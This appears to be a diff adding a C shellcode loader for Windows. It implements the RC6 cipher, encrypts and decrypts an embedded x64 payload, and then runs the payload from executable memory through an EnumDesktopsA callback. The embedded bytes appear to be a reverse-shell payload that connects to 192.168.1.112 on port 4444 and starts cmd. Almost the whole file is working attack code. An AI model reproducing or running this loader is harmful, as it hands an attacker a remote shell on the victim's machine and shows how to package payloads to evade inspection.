@@ -1,0 +1,151 @@
+#include <stdint.h>
+#include <string.h>
+#include <math.h>
+#include <stdio.h>
+#include <windows.h>
+
+#define WORD uint32_t
+#define W_BITS 32
+#define ROUNDS 20
+#define KEYLEN 16
+
+#define P32 0xB7E15163
+#define Q32 0x9E3779B9
+
+#define ROTL(x, y) (((x) << (y & (W_BITS - 1))) | ((x) >> (W_BITS - (y & (W_BITS - 1)))))
+#define ROTR(x, y) (((x) >> (y & (W_BITS - 1))) | ((x) << (W_BITS - (y & (W_BITS - 1)))))
+
+void rc6_setup(const uint8_t *key, WORD S[2 * ROUNDS + 4]) {
+  int i, j, s, A, B, L[KEYLEN / sizeof(int)], L32 = KEYLEN / (2 * sizeof(int));
+
+  for (i = KEYLEN - 1, L[KEYLEN / sizeof(int) - 1] = 0; i != -1; i--)
+    L[i / sizeof(int)] = (L[i / sizeof(int)] << 8) + key[i];
+
+  for (S[0] = P32, i = 1; i < 2 * ROUNDS + 4; i++)
+    S[i] = S[i - 1] + Q32;
+
+  for (A = B = i = j = s = 0; s < 3 * ((2 * ROUNDS + 4) > (2 * L32) ? (2 * ROUNDS + 4) : (2 * L32)); s++, i = (i + 1) % (2 * ROUNDS + 4), j = (j + 1) % (2 * L32))
+    S[i] = ROTL((S[i] + A + B), 3), A = S[i] = ROTL((S[i] + A + B), (A + B)), B = L[j] = ROTL((L[j] + A + B), (A + B));
+
+  return;
+}
+
+void rc6_encrypt(const uint8_t pt[16], const WORD S[2 * ROUNDS + 4], uint8_t ct[16]) {
+  WORD A = *(WORD *)(pt + 0), B = *(WORD *)(pt + 4), C = *(WORD *)(pt + 8), D = *(WORD *)(pt + 12), t, u;
+  B += S[0], D += S[1];
+  for (int i = 1; i <= ROUNDS; i++) {
+    t = ROTL(B * (2 * B + 1), 5), u = ROTL(D * (2 * D + 1), 5), A = ROTL(A ^ t, u) + S[2 * i], C = ROTL(C ^ u, t) + S[2 * i + 1], t = A, A = B, B = C, C = D, D = t;
+  }
+  A += S[2 * ROUNDS + 2], C += S[2 * ROUNDS + 3];
+  *(WORD *)(ct + 0) = A, *(WORD *)(ct + 4) = B, *(WORD *)(ct + 8) = C, *(WORD *)(ct + 12) = D;
+  return;
+}
+
+void rc6_decrypt(const uint8_t ct[16], const WORD S[2 * ROUNDS + 4], uint8_t pt[16]) {
+  WORD A = *(WORD *)(ct + 0), B = *(WORD *)(ct + 4), C = *(WORD *)(ct + 8), D = *(WORD *)(ct + 12), t, u;
+  C -= S[2 * ROUNDS + 3], A -= S[2 * ROUNDS + 2];
+  for (int i = ROUNDS; i >= 1; i--) {
+    t = D, D = C, C = B, B = A, A = t, u = ROTL(D * (2 * D + 1), 5), t = ROTL(B * (2 * B + 1), 5), C = ROTR(C - S[2 * i + 1], t) ^ u, A = ROTR(A - S[2 * i], u) ^ t;
+  }
+  D -= S[1], B -= S[0];
+  *(WORD *)(pt + 0) = A, *(WORD *)(pt + 4) = B, *(WORD *)(pt + 8) = C, *(WORD *)(pt + 12) = D;
+  return;
+}
+int main() {
+
+  uint8_t key[KEYLEN] = { 0x24, 0x3F, 0x6A, 0x88, 0x85, 0xA3, 0x08, 0xD3, 0x45, 0x28, 0x21, 0xE6, 0x38, 0xD0, 0x13, 0x77 };
+  WORD S[2 * ROUNDS + 4];
+  rc6_setup(key, S);
+
+  unsigned char data[] = {
+"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50"
+"\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52"
+"\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a"
+"\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41"
+"\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52"
+"\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48"
+"\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40"
+"\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48"
+"\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41"
+"\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1"
+"\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c"
+"\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01"
+"\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a"
+"\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b"
+"\x12\xe9\x57\xff\xff\xff\x5d\x49\xbe\x77\x73\x32\x5f\x33"
+"\x32\x00\x00\x41\x56\x49\x89\xe6\x48\x81\xec\xa0\x01\x00"
+"\x00\x49\x89\xe5\x49\xbc\x02\x00\x11\x5c\xc0\xa8\x01\x70"
+"\x41\x54\x49\x89\xe4\x4c\x89\xf1\x41\xba\x4c\x77\x26\x07"
+"\xff\xd5\x4c\x89\xea\x68\x01\x01\x00\x00\x59\x41\xba\x29"
+"\x80\x6b\x00\xff\xd5\x50\x50\x4d\x31\xc9\x4d\x31\xc0\x48"
+"\xff\xc0\x48\x89\xc2\x48\xff\xc0\x48\x89\xc1\x41\xba\xea"
+"\x0f\xdf\xe0\xff\xd5\x48\x89\xc7\x6a\x10\x41\x58\x4c\x89"
+"\xe2\x48\x89\xf9\x41\xba\x99\xa5\x74\x61\xff\xd5\x48\x81"
+"\xc4\x40\x02\x00\x00\x49\xb8\x63\x6d\x64\x00\x00\x00\x00"
+"\x00\x41\x50\x41\x50\x48\x89\xe2\x57\x57\x57\x4d\x31\xc0"
+"\x6a\x0d\x59\x41\x50\xe2\xfc\x66\xc7\x44\x24\x54\x01\x01"
+"\x48\x8d\x44\x24\x18\xc6\x00\x68\x48\x89\xe6\x56\x50\x41"
+"\x50\x41\x50\x41\x50\x49\xff\xc0\x41\x50\x49\xff\xc8\x4d"
+"\x89\xc1\x4c\x89\xc1\x41\xba\x79\xcc\x3f\x86\xff\xd5\x48"
+"\x31\xd2\x48\xff\xca\x8b\x0e\x41\xba\x08\x87\x1d\x60\xff"
+"\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd\x9d\xff\xd5"
+"\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb"
+"\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5";
+
+ int data_size = sizeof(data);
+  int padded_size = (data_size + 15) & ~15; // pad data to the nearest multiple of 16
+
+  printf("original data:\n");
+  for (int i = 0; i < data_size; ++i) {
+    printf("%02x ", data[i]);
+  }
+  printf("\n\n");
+
+  unsigned char padded_data[padded_size];
+  memcpy(padded_data, data, data_size);
+
+  unsigned char encrypted[padded_size];
+  unsigned char decrypted[padded_size];
+
+  for (int i = 0; i < padded_size; i += 16) {
+    uint8_t message_chunk[16];
+    memcpy(message_chunk, padded_data + i, sizeof(message_chunk));
+
+    rc6_encrypt(message_chunk, S, message_chunk);
+    memcpy(encrypted + i, message_chunk, sizeof(message_chunk));
+
+    rc6_decrypt(message_chunk, S, message_chunk);
+    memcpy(decrypted + i, message_chunk, sizeof(message_chunk));
+  }
+
+  printf("padded data:\n");
+  for (int i = 0; i < padded_size; ++i) {
+    printf("%02x ", padded_data[i]);
+  }
+  printf("\n\n");
+
+  printf("encrypted data:\n");
+  for (int i = 0; i < padded_size; ++i) {
+    printf("%02x ", encrypted[i]);
+  }
+  printf("\n\n");
+
+  printf("decrypted data:\n");
+  for (int i = 0; i < padded_size; ++i) {
+    printf("%02x ", decrypted[i]);
+  }
+  printf("\n\n");
+
+  // Compare decrypted data with original data
+  if (memcmp(data, decrypted, data_size) == 0) {
+    printf("encryption and decryption successful.\n");
+  } else {
+    printf("encryption and decryption failed.\n");
+  }
+
+  LPVOID mem = VirtualAlloc(NULL, data_size, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+  RtlMoveMemory(mem, decrypted, data_size);
+  EnumDesktopsA(GetProcessWindowStation(), (DESKTOPENUMPROCA)mem, (long long int)NULL);
+
+  return 0;
+}
